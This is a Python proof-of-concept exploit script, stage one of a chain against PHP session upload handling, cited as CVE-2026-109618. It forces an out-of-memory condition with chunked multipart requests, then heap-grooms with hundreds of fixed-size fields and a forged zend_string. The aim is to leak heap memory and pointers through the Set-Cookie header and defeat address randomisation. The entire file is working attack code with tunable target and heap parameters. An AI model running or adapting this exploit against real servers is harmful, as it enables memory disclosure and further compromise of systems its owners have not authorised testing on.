#!/usr/bin/env python3
"""newPoc Stage 1: OOM (CVE-2026-109618) -> stale PS(id) -> heap leak.

Cat-and-mouse diagnostics. Each sub-step is observable:
  step A: fire OOM (chunked, post_max_size bypass) -> expect 5xx, worker survives
  step B: read the stale PS(id) as a forged zend_string -> Set-Cookie heap dump

All heap-shape knobs are CLI args so we can calibrate per glibc/target.

Usage:
  python3 stage1_leak.py --port 18113 --stage1-n 841 --forge-len 0x1000
"""
from __future__ import annotations
import argparse
import struct
import sys
import time

from common import (Target, build_multipart, extract_cookie_line,
                    parse_cookie, hexdump, count_heap_pointers)

SID = b"attacksessionid0001"


def oom_request(t: Target, huge_mb: int, boundary: bytes) -> tuple[int, bytes]:
    """Rotate/OOM request: many small fields + session + file + one huge field.

    huge_mb must exceed memory_limit to OOM (for a Content-Length POST).
    For chunked, the OOM comes from the field size vs memory_limit.
    """
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (huge_mb * 1024 * 1024)},
    ]
    body = build_multipart(parts, boundary)
    st, raw = t.post_chunked(body, boundary, read_cap=1 << 20)
    return st, raw


def leak_request(t: Target, stage1_n: int, forge_len: int,
                 boundary: bytes) -> tuple[int, bytes]:
    """Read stale PS(id): session init + N 48-byte shapers + forged zend_string.

    The forged field carries a fake zend_string header (len=forge_len) so that
    when the worker dereferences the stale PS(id) it dumps `forge_len` heap bytes
    into the Set-Cookie.
    """
    parts = [
        {"name": "PHPSESSID", "data": SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(stage1_n):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    # forged zend_string: 79-byte value, len at +0x10, first data byte at +0x18
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, forge_len)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    body = build_multipart(parts, boundary)
    return t.post_chunked(body, boundary, read_cap=9 << 20)


def analyze(raw: bytes, label: str) -> None:
    cookie_line = extract_cookie_line(raw)
    cookie = parse_cookie(raw)
    print(f"  [{label}] cookie_line bytes = {len(cookie_line)}")
    print(f"  [{label}] decoded cookie bytes = {len(cookie)}")
    if cookie:
        base2m, cnt = count_heap_pointers(cookie, ~0x1FFFFF)
        base4k, cnt4 = count_heap_pointers(cookie, ~0xFFF)
        print(f"  [{label}] 2MB-aligned heap ptrs: base=0x{base2m:x} count={cnt}")
        print(f"  [{label}] 4KB-aligned heap ptrs: base=0x{base4k:x} count={cnt4}")
        print(f"  [{label}] cookie hexdump:\n{hexdump(cookie, 256)}")
    else:
        print(f"  [{label}] NO cookie value (session not established or aborted)")


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="192.168.8.123")
    ap.add_argument("--port", type=int, default=18113)
    ap.add_argument("--huge-mb", type=int, default=140,
                    help="OOM field size; must exceed memory_limit (128M here)")
    ap.add_argument("--stage1-n", type=int, default=841,
                    help="number of 48-byte heap shapers (bookworm=841)")
    ap.add_argument("--forge-len", type=lambda x: int(x, 0), default=0x1000,
                    help="forged zend_string len")
    ap.add_argument("--no-oom", action="store_true",
                    help="skip the OOM step (isolate the leak read)")
    ap.add_argument("-q", action="store_true")
    args = ap.parse_args()

    t = Target(args.host, args.port, verbose=not args.q)
    bnd = b"S" * 17

    if not args.no_oom:
        t.log(f"[*] step A: OOM (huge={args.huge_mb}MB)")
        st, raw = oom_request(t, args.huge_mb, bnd)
        t.log(f"    status={st}  cookie_line={extract_cookie_line(raw)!r}")
        time.sleep(0.4)

    t.log(f"[*] step B: leak read (stage1_n={args.stage1_n} forge_len={args.forge_len:#x})")
    st, raw = leak_request(t, args.stage1_n, args.forge_len, b"BNDRY12345")
    t.log(f"    status={st}")
    analyze(raw, "B")
    return 0


if __name__ == "__main__":
    sys.exit(main())
